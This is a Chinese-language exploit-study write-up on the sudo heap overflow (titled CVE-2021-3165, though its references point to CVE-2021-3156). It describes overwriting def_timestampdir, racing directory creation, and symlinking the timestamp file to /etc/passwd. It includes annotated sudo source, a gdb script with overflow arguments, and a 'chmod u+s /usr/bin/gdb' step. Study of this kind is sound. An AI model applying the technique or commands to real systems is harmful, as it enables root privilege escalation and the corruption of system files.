# CVE-2021-3165_第三种方法

这个方法是 覆盖了 def_timestampdir这个结构

```
#define def_timestampdir        (sudo_defs_table[I_TIMESTAMPDIR].sd_un.str)
```

然后我就通过 引用来看是在哪里引用了，然后我发现

是在这个 函数 check_user

```c
int
check_user(int validated, int mode)
{
    struct getpass_closure closure = { TS_ERROR };
    int ret = -1;
    bool exempt = false;
    debug_decl(check_user, SUDOERS_DEBUG_AUTH)

    /*
     * Init authentication system regardless of whether we need a password.
     * Required for proper PAM session support.
     */
    if ((closure.auth_pw = get_authpw(mode)) == NULL)
	goto done;
    if (sudo_auth_init(closure.auth_pw) == -1)
	goto done;

    /*
     * Don't prompt for the root passwd or if the user is exempt.
     * If the user is not changing uid/gid, no need for a password.
     */
    if (!def_authenticate || user_is_exempt()) {
	sudo_debug_printf(SUDO_DEBUG_INFO, "%s: %s", __func__,
	    !def_authenticate ? "authentication disabled" :
	    "user exempt from authentication");
	exempt = true;
	ret = true;
	goto done;
    }
    if (user_uid == 0 || (user_uid == runas_pw->pw_uid &&
	(!runas_gr || (sudo_user.pw, runas_gr->gr_name)))) {
#ifdef HAVE_SELINUX
	if (user_role == NULL && user_type == NULL)
#endif
#ifdef HAVE_PRIV_SET
	if (runas_privs == NULL && runas_limitprivs == NULL)
#endif
	{
	    sudo_debug_printf(SUDO_DEBUG_INFO,
		"%s: user running command as self", __func__);
	    ret = true;
	    goto done;
	}
    }

    ret = check_user_interactive(validated, mode, &closure);

done:
    if (ret == true) {
	/* The approval function may disallow a user post-authentication. */
	ret = sudo_auth_approval(closure.auth_pw, validated, exempt);

	/*
	 * Only update time stamp if user validated and was approved.
	 * Failure to update the time stamp is not a fatal error.
	 */
	if (ret == true && closure.tstat != TS_ERROR) {
	    if (ISSET(validated, VALIDATE_SUCCESS))
		(void)timestamp_update(closure.cookie, closure.auth_pw);
	}
    }
    timestamp_close(closure.cookie);
    sudo_auth_cleanup(closure.auth_pw);
    if (closure.auth_pw != NULL)
	sudo_pw_delref(closure.auth_pw);

    debug_return_int(ret);
}
```

然后我发现我断不下来。呜呜

然后去看了别人的exp，发现是启动的问题,要多加一个 -A，然后还有设置环境变量

```
SUDO_ASKPASS=/bin/false
```

然后就进去了

这里先用gdb调试

```
chmod u+s /usr/bin/gdb
```

然后可以让gdb有了普通权限调试sudo程序了

下面是调试脚本

```python
import gdb
import time
import re


def exe(cmd):
    gdb.execute(cmd)

def start():
    gdb.execute('r')

def end():
    gdb.execute('quit')

def kill():
    gdb.execute('kill')

def bp(cmd):
    exe(cmd)
def set(cmd):
    exe("set "+cmd)

def main():
    exe('file /usr/local/bin/sudoedit')
    payload = "set args -s 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\'"
    exe(payload)
    start()
    exe('set environment SUDO_ASKPASS /bin/false')
    bp("b timestamp_open")
    bp("b check.c:193")
    bp("b timestamp_lock")
    bp("b check_user_interactive")
    bp("b timestamp.c:204")
    bp("b timestamp.c:210")
    #bp("b sudoers.c:854")
    #bp("b sudoers.c:870")
    bp("set follow-fork-mode parent")
    set("args -A -s '\\' '1111111111111111111111111111111111111111ayylmaobigchungussssssssssss000000000000000000000000000000000000000000000000000000000001'")
    exe("set environment LC_MESSAGES C.UTF-8@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")
    start()
    #exe('c')
    #exe('c')
    #set("sudo_user.uid=1000")
    #set("sudo_user.gid=1000")
    #set("*(long long int*)(sudo_user.name)=0x697a6579")

if __name__=="__main__":
    main()

```

然后就一步步走了

那就从check_user 函数开始

check_user 里面会有个验证uid，这个uid是存储在 sudo里面的一个全局的结构体 sudo_user 里面

```c
    if (user_uid == 0 || (user_uid == runas_pw->pw_uid && //[1]
	(!runas_gr || (sudo_user.pw, runas_gr->gr_name)))) {
#ifdef HAVE_SELINUX
	if (user_role == NULL && user_type == NULL)
#endif
#ifdef HAVE_PRIV_SET
	if (runas_privs == NULL && runas_limitprivs == NULL)
#endif
	{
	    sudo_debug_printf(SUDO_DEBUG_INFO,
		"%s: user running command as self", __func__);
	    ret = true;
	    goto done;
	}
    }

    ret = check_user_interactive(validated, mode, &closure);//[2]
```

因为 [1] 处user_uid=1000,然后后面的判断也不成立，就进入了 [2]

```c
static int
check_user_interactive(int validated, int mode, struct getpass_closure *closure)
{
    struct sudo_conv_callback cb, *callback = NULL;
    int ret = -1;
    char *prompt;
    bool lectured;
    debug_decl(check_user_interactive, SUDOERS_DEBUG_AUTH)

    /* Open, lock and read time stamp file if we are using it. */
    if (!ISSET(mode, MODE_IGNORE_TICKET)) {
	/* Open time stamp file and check its status. */
	closure->cookie = timestamp_open(user_name, user_sid); //[1]
	if (timestamp_lock(closure->cookie, closure->auth_pw))//[2]
	    closure->tstat = timestamp_status(closure->cookie, closure->auth_pw);

	/* Construct callback for getpass function. */
	memset(&cb, 0, sizeof(cb));
	cb.version = SUDO_CONV_CALLBACK_VERSION;
	cb.closure = closure;
	cb.on_suspend = getpass_suspend;
	cb.on_resume = getpass_resume;
	callback = &cb;
    }

    switch (closure->tstat) {
    case TS_FATAL:
	/* Fatal error (usually setuid failure), unsafe to proceed. */
	goto done;

    case TS_CURRENT:
	/* Time stamp file is valid and current. */
	if (!ISSET(validated, FLAG_CHECK_USER)) {
	    ret = true;
	    break;
	}
	sudo_debug_printf(SUDO_DEBUG_INFO,
	    "%s: check user flag overrides time stamp", __func__);
	/* FALLTHROUGH */

    default:
	/* Bail out if we are non-interactive and a password is required */
	if (ISSET(mode, MODE_NONINTERACTIVE)) {
	    validated |= FLAG_NON_INTERACTIVE;
	    log_auth_failure(validated, 0);
	    goto done;
	}

	/* XXX - should not lecture if askpass helper is being used. */
	lectured = display_lecture(closure->tstat);

	/* Expand any escapes in the prompt. */
	prompt = expand_prompt(user_prompt ? user_prompt : def_passprompt,
	    closure->auth_pw->pw_name);
	if (prompt == NULL)
	    goto done;

	ret = verify_user(closure->auth_pw, prompt, validated, callback);
	if (ret == true && lectured)
	    (void)set_lectured();	/* lecture error not fatal */
	free(prompt);
	break;
    }

done:
    debug_return_int(ret);
}
```

重点就在 [1] [2]



```c
timestamp_open(const char *user, pid_t sid)
{
    struct ts_cookie *cookie;
    char *fname = NULL;
    int tries, fd = -1;
    debug_decl(timestamp_open, SUDOERS_DEBUG_AUTH)

    /* Zero timeout means don't use the time stamp file. */
    if (!sudo_timespecisset(&def_timestamp_timeout)) {
	errno = ENOENT;
	goto bad;
    }

    /* Sanity check timestamp dir and create if missing. */
    if (!ts_secure_dir(def_timestampdir, true, false))//[1]
	goto bad;

    /* Open time stamp file. */
    if (asprintf(&fname, "%s/%s", def_timestampdir, user) == -1) { //[2]
	sudo_warnx(U_("%s: %s"), __func__, U_("unable to allocate memory"));
	goto bad;
    }
    for (tries = 1; ; tries++) {
	struct stat sb;
	// 上面能看到 (asprintf(&fname, "%s/%s", def_timestampdir, user)  这个是配置 stampfile的文件名字的
	fd = ts_open(fname, O_RDWR|O_CREAT);
	switch (fd) {
	case TIMESTAMP_OPEN_ERROR:
	    log_warning(SLOG_SEND_MAIL, N_("unable to open %s"), fname);
	    goto bad;
	case TIMESTAMP_PERM_ERROR:
	    /* Already logged set_perms/restore_perms error. */
	    goto bad;
	}

	/* Remove time stamp file if its mtime predates boot time. */
	if (tries == 1 && fstat(fd, &sb) == 0) {
	    struct timespec boottime, mtime, now;

	    if (sudo_gettime_real(&now) == 0 && get_boottime(&boottime)) {
		/* Ignore a boot time that is in the future. */
		if (sudo_timespeccmp(&now, &boottime, <)) {
		    sudo_debug_printf(SUDO_DEBUG_WARN|SUDO_DEBUG_LINENO,
			"ignoring boot time that is in the future");
		} else {
		    mtim_get(&sb, mtime);
		    if (sudo_timespeccmp(&mtime, &boottime, <)) {
			/* Time stamp file too old, remove it. */
			sudo_debug_printf(SUDO_DEBUG_WARN|SUDO_DEBUG_LINENO,
			    "removing time stamp file that predates boot time");
			close(fd);
			unlink(fname);
			continue;
		    }
		}
	    }
	}
	break;
    }

    /* Allocate and fill in cookie to store state. */
    cookie = malloc(sizeof(*cookie));
    if (cookie == NULL) {
	sudo_warnx(U_("%s: %s"), __func__, U_("unable to allocate memory"));
	goto bad;
    }
    cookie->fd = fd;
    cookie->fname = fname;
    cookie->sid = sid;
    cookie->pos = -1;

    debug_return_ptr(cookie);
bad:
    if (fd != -1)
	close(fd);
    free(fname);
    debug_return_ptr(NULL);
}

```

如果我们溢出，修改了 def_timestampdir 那么在  timestamp_open的时候 那么在经过了 [1]

ts_secure_dir 检查 这个路径之后 就会来到 [2] 处，这里会组装路径，user就是你的普通用户的名字

def_timestampdir  受我们控制，那么现在先说 怎么绕过 ts_secure_dir 的检测

```c
static bool
ts_secure_dir(char *path, bool make_it, bool quiet)
{
    struct stat sb;
    bool ret = false;
    debug_decl(ts_secure_dir, SUDOERS_DEBUG_AUTH)

    sudo_debug_printf(SUDO_DEBUG_INFO|SUDO_DEBUG_LINENO, "checking %s", path);
    switch (sudo_secure_dir(path, timestamp_uid, -1, &sb)) {//[1]
    case SUDO_PATH_SECURE:
	ret = true;
	break;
    case SUDO_PATH_MISSING:
	if (make_it && ts_mkdirs(path, timestamp_uid, timestamp_gid, S_IRWXU,//[2]
	    S_IRWXU|S_IXGRP|S_IXOTH, quiet)) {
	    ret = true;
	    break;
	}
	errno = ENOENT;
	break;
    case SUDO_PATH_BAD_TYPE:
	errno = ENOTDIR;
	if (!quiet)
	    sudo_warn("%s", path);
	break;
    case SUDO_PATH_WRONG_OWNER:
	if (!quiet) {
	    sudo_warnx(U_("%s is owned by uid %u, should be %u"),
		path, (unsigned int) sb.st_uid,
		(unsigned int) timestamp_uid);
	}
	errno = EACCES;
	break;
    case SUDO_PATH_GROUP_WRITABLE:
	if (!quiet)
	    sudo_warnx(U_("%s is group writable"), path);
	errno = EACCES;
	break;
    }
    debug_return_bool(ret);
}

static bool
ts_mkdirs(char *path, uid_t owner, gid_t group, mode_t mode,
    mode_t parent_mode, bool quiet)
{
    bool ret;
    mode_t omask;
    debug_decl(ts_mkdirs, SUDOERS_DEBUG_AUTH)

    /* umask must not be more restrictive than the file modes. */
    omask = umask(ACCESSPERMS & ~(mode|parent_mode));
    ret = sudo_mkdir_parents(path, owner, group, parent_mode, quiet);
    if (ret) {
	/* Create final path component. */
	sudo_debug_printf(SUDO_DEBUG_DEBUG|SUDO_DEBUG_LINENO,
	    "mkdir %s, mode 0%o, uid %d, gid %d", path, (unsigned int)mode,
	    (int)owner, (int)group);
	if (mkdir(path, mode) != 0 && errno != EEXIST) { //[3]
	    if (!quiet)
		sudo_warn(U_("unable to mkdir %s"), path);
	    ret = false;
	} else {
	    if (chown(path, owner, group) != 0) { //[4]
		sudo_debug_printf(SUDO_DEBUG_ERROR|SUDO_DEBUG_ERRNO,
		    "%s: unable to chown %d:%d %s", __func__,
		    (int)owner, (int)group, path);
	    }
	}
    }
    umask(omask);
    debug_return_bool(ret);
}
```

这里有四步蛮重要的

第一步检测路径和权限，这时候让它不存在，进入[2]

然后在[3]里面会创建 文件夹，这时候我们race，自己创建一个文件夹，然后mkdir就报错，如果我们不自己创建文件夹，那么这时候问题就大了，sudo程序创建的这个目录是root，我们无法访问，接下来也莫得办法。

创建的时间在 [2] [3] 之间应该都可，然后到[4] 这时候，如果让它执行成，那就等于，前面[3] sudo程序mkdir成功了，那肯定不能让它成功，这时候就得删除掉这个文件夹，然后chown就会报错，但是不影响返回值

然后这里就绕过了 这个 ts_secure_dir 成功走到 timestamp_open的下面

```c
    /* Open time stamp file. */
    if (asprintf(&fname, "%s/%s", def_timestampdir, user) == -1) { //[1]
	sudo_warnx(U_("%s: %s"), __func__, U_("unable to allocate memory"));
	goto bad;
    }
    for (tries = 1; ; tries++) {
	struct stat sb;
	// 上面能看到 (asprintf(&fname, "%s/%s", def_timestampdir, user)  这个是配置 stampfile的文件名字的
	fd = ts_open(fname, O_RDWR|O_CREAT); //[2]
	switch (fd) {
	case TIMESTAMP_OPEN_ERROR:
	    log_warning(SLOG_SEND_MAIL, N_("unable to open %s"), fname);
	    goto bad;
	case TIMESTAMP_PERM_ERROR:
	    /* Already logged set_perms/restore_perms error. */
	    goto bad;
	}

	/* Remove time stamp file if its mtime predates boot time. */
	if (tries == 1 && fstat(fd, &sb) == 0) { //[3]
	    struct timespec boottime, mtime, now;

	    if (sudo_gettime_real(&now) == 0 && get_boottime(&boottime)) {
		/* Ignore a boot time that is in the future. */
		if (sudo_timespeccmp(&now, &boottime, <)) {
		    sudo_debug_printf(SUDO_DEBUG_WARN|SUDO_DEBUG_LINENO,
			"ignoring boot time that is in the future");
		} else {
		    mtim_get(&sb, mtime);
		    if (sudo_timespeccmp(&mtime, &boottime, <)) {
			/* Time stamp file too old, remove it. */
			sudo_debug_printf(SUDO_DEBUG_WARN|SUDO_DEBUG_LINENO,
			    "removing time stamp file that predates boot time");
			close(fd);
			unlink(fname); //[4]
			continue;
		    }
		}
	    }
	}
	break;
    }

    /* Allocate and fill in cookie to store state. */
    cookie = malloc(sizeof(*cookie));
    if (cookie == NULL) {
	sudo_warnx(U_("%s: %s"), __func__, U_("unable to allocate memory"));
	goto bad;
    }
    cookie->fd = fd;
    cookie->fname = fname;
    cookie->sid = sid;
    cookie->pos = -1;

    debug_return_ptr(cookie);
bad:
    if (fd != -1)
	close(fd);
    free(fname);
    debug_return_ptr(NULL);
}
```

这时候 就到了 [1] 组装文件名字和路径的时候了，然后[2] open,我们得在这个open和前面的chown之间 创建回来这个文件夹，和我们设置的链接，才能open成功，举个例子来作为open的说明

```
obigchungussssssssssss000000000000000000000000000000000000000000000000000000000001/yezi
yezi软链接到 /etc/passwd

建议创建的是 777的文件夹权限
```

这个就是我创建的文件夹和名字，然后open完，进入到下面的时间戳检测，因为passwd 的确比机器启动的时候还早，所以会进入到 [4],这个时候这个文件会给删除掉了，明明我创建的 obigchungussssssssssss000000000000000000000000000000000000000000000000000000000001/yezi

这个文件要比 boottime要晚，为啥 会是passwd的时间呢，因为这里用到fstat，它如果用在软连接的文件上，就会获取到软连接到的程序上，所以比boottine还早，但是呢这里的进入条件是 tries == 1 第二次就进不来了，所以我再创建一次就OK了，然后这个 timestamp_open 就成功打开了 我们控制的 symlink

下面就到了 timestamp_lock 函数 ，这个函数可以写东西进去

```c
bool
timestamp_lock(void *vcookie, struct passwd *pw)
{
    struct ts_cookie *cookie = vcookie;
    struct timestamp_entry entry;
    off_t lock_pos;
    ssize_t nread;
    debug_decl(timestamp_lock, SUDOERS_DEBUG_AUTH)

    if (cookie == NULL) {
	sudo_debug_printf(SUDO_DEBUG_DEBUG|SUDO_DEBUG_LINENO,
	    "called with a NULL cookie!");
	debug_return_bool(false);
    }

    /*
     * Take a lock on the "write" record (the first record in the file).
     * This will let us seek for the record or extend as needed
     * without colliding with anyone else.
     */
    if (!timestamp_lock_record(cookie->fd, 0, sizeof(struct timestamp_entry)))
	debug_return_bool(false);

    /* Make sure the first record is of type TS_LOCKEXCL. */
    memset(&entry, 0, sizeof(entry)); 
    nread = read(cookie->fd, &entry, sizeof(entry));//[1]
    if (nread == 0) {
	/* New file, add TS_LOCKEXCL record. */
	entry.version = TS_VERSION;
	entry.size = sizeof(entry);
	entry.type = TS_LOCKEXCL;
	if (ts_write(cookie->fd, cookie->fname, &entry, -1) == -1)//[2]
	    debug_return_bool(false);
    } else if (entry.type != TS_LOCKEXCL) {
	/* Old sudo record, convert it to TS_LOCKEXCL. */
 *************
}
    
static ssize_t
ts_write(int fd, const char *fname, struct timestamp_entry *entry, off_t offset)
{
    ssize_t nwritten;
    off_t old_eof;
    debug_decl(ts_write, SUDOERS_DEBUG_AUTH)

    if (offset == -1) {
	old_eof = lseek(fd, 0, SEEK_CUR);
	nwritten = write(fd, entry, entry->size);
    } else {
	old_eof = offset;
#ifdef HAVE_PWRITE
	nwritten = pwrite(fd, entry, entry->size, offset);//[3]
#else
	if (lseek(fd, offset, SEEK_SET) == -1) {
	    sudo_debug_printf(SUDO_DEBUG_ERROR|SUDO_DEBUG_ERRNO|SUDO_DEBUG_LINENO,
		"unable to seek to %lld", (long long)offset);
	    nwritten = -1;
	} else {
	    nwritten = write(fd, entry, entry->size);
	}
#endif
    }
    if ((size_t)nwritten != entry->size) {//[4]
	if (nwritten == -1) {
	    log_warning(SLOG_SEND_MAIL,
		N_("unable to write to %s"), fname);
	} else {
	    log_warningx(SLOG_SEND_MAIL,
		N_("unable to write to %s"), fname);
	}

	/* Truncate on partial write to be safe (assumes end of file). */
	if (nwritten > 0) {
	    sudo_debug_printf(SUDO_DEBUG_DEBUG|SUDO_DEBUG_LINENO,
		"short write, truncating partial time stamp record");
	    if (ftruncate(fd, old_eof) != 0) {
		sudo_warn(U_("unable to truncate time stamp file to %lld bytes"),
		    (long long)old_eof);
	    }
	}
	debug_return_ssize_t(-1);
    }
    debug_return_ssize_t(nwritten);
}
```



这里到 [1] 处，因为我们的/etc/passwd肯定不是空的，所以进入到[2]，然后在[2] 里面主要一点，不然就是算写入了，也得被清空

主要[4]的位置有一个 检测写入size，那算，写入的size要等于那个，那就得在环境变量里面多加很多多余的数据来填充

![image-20210208155841874](https://github.com/leave-Devour/Skr_learn/blob/main/First_week/imgages/image-20210208155841874.png)

整个大概的利用过程就这样

![image-20210208155922200](https://github.com/leave-Devour/Skr_learn/blob/main/First_week/imgages/image-20210208155922200.png)

参考链接

[1](https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt)

[stong](https://github.com/stong/CVE-2021-3156)

